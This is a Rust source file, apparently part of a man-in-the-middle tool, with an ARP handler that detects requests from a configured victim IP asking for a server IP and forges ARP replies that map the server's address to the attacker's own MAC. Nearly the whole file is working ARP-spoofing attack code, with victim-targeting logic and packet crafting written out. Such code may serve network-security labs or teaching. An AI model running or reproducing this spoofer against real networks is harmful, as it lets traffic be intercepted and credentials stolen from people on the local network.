use std::net::Ipv4Addr;

use anyhow::{Result, bail};
use pnet::packet::arp::{ArpOperation, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::EtherTypes;
use pnet::util::MacAddr;

use crate::constants::{ARP_PACKET_SIZE, SERVER_IP, VICTIM_IP};

pub struct ArpHandler {
    own_mac_address: MacAddr,
    expected_victim_ip: Ipv4Addr,
    expected_asked_ip: Ipv4Addr,
}

impl ArpHandler {
    pub fn new(own_mac_address: MacAddr) -> Self {
        Self {
            own_mac_address,
            expected_victim_ip: VICTIM_IP.parse().unwrap(),
            expected_asked_ip: SERVER_IP.parse().unwrap(),
        }
    }

    /// Handle a raw arp packet.
    ///
    /// ## Returns
    ///
    /// - Ok(Vec<u8>) to send a reponse
    /// - Ok(None) to ignore the packet
    /// - Err on error
    pub fn handle_packet(&mut self, packet: &[u8], _options: ()) -> Result<Option<Vec<u8>>> {
        log::trace!("received ARP packet...");

        let Some(inbound_arp_packet) = ArpPacket::new(packet) else {
            bail!("cannot create arp packet...")
        };

        if !self.should_intercept(
            inbound_arp_packet.get_operation(),
            inbound_arp_packet.get_sender_proto_addr(),
            inbound_arp_packet.get_target_proto_addr(),
        ) {
            return Ok(None);
        }

        let asked_ip = inbound_arp_packet.get_target_proto_addr();
        let victim_mac = inbound_arp_packet.get_sender_hw_addr();
        let victim_ip = inbound_arp_packet.get_sender_proto_addr();

        log::info!("need to spoof ARP request from {victim_ip}({victim_mac}) asking {asked_ip}");

        let mut payload = vec![0; ARP_PACKET_SIZE];

        let Some(mut outbound_arp_packet) = MutableArpPacket::new(&mut payload) else {
            bail!("cannot create arp packet")
        };

        outbound_arp_packet.set_protocol_type(EtherTypes::Ipv4);
        outbound_arp_packet.set_operation(ArpOperations::Reply);
        outbound_arp_packet.set_hardware_type(inbound_arp_packet.get_hardware_type());
        outbound_arp_packet.set_hw_addr_len(inbound_arp_packet.get_hw_addr_len());
        outbound_arp_packet.set_proto_addr_len(inbound_arp_packet.get_proto_addr_len());

        // Spoof sender info
        outbound_arp_packet.set_sender_hw_addr(self.own_mac_address);
        outbound_arp_packet.set_sender_proto_addr(asked_ip);

        // Set target addresses
        outbound_arp_packet.set_target_hw_addr(victim_mac);
        outbound_arp_packet.set_target_proto_addr(victim_ip);

        log::info!("succesfully crafted arp packet...");

        Ok(Some(payload))
    }

    fn should_intercept(
        &self,
        arp_operation: ArpOperation,
        sender_ip: Ipv4Addr,
        target_ip: Ipv4Addr,
    ) -> bool {
        matches!(arp_operation, ArpOperations::Request)
            && sender_ip == self.expected_victim_ip
            && target_ip == self.expected_asked_ip
    }
}
